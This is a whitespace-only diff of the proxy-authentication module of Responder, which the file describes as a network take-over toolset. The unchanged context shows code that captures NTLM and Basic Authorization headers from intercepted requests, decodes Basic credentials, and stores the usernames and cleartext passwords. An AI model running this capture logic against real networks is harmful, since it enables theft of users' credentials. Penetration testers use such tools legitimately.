@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
+# This file is part of Responder, a network take-over set of tools
 # created and maintained by the watchers.
 # email: providence@tao.oga
 # This program is free software: you can redistribute it and/or modify
@@ -52,7 +52,7 @@ def GrabHost(data):
 
 def PacketSequence(data, client, Challenge):
 	NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
-	Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)	
+	Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)
 	if NTLM_Auth:
 		Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
 		if Packet_NTLM == b'\x01':
@@ -82,11 +82,11 @@ def PacketSequence(data, client, Challenge):
 		GrabHost(data)
 		ClearText_Auth = b64decode(''.join(Basic_Auth).encode('latin-1'))
 		SaveToDb({
-			'module': 'Proxy-Auth', 
-			'type': 'Basic', 
-			'client': client, 
-			'user': ClearText_Auth.decode('latin-1').split(':')[0], 
-			'cleartext': ClearText_Auth.decode('latin-1').split(':')[1], 
+			'module': 'Proxy-Auth',
+			'type': 'Basic',
+			'client': client,
+			'user': ClearText_Auth.decode('latin-1').split(':')[0],
+			'cleartext': ClearText_Auth.decode('latin-1').split(':')[1],
 			})
 
 		return False
@@ -118,7 +118,7 @@ class Proxy_Auth(BaseRequestHandler):
 					data += buff
 					remaining -= len(buff)
 					#check if we recieved the full header
-					if data.find('\r\n\r\n') != -1: 
+					if data.find('\r\n\r\n') != -1:
 						#we did, now to check if there was anything else in the request besides the header
 						if data.find('Content-Length') == -1:
 							#request contains only header
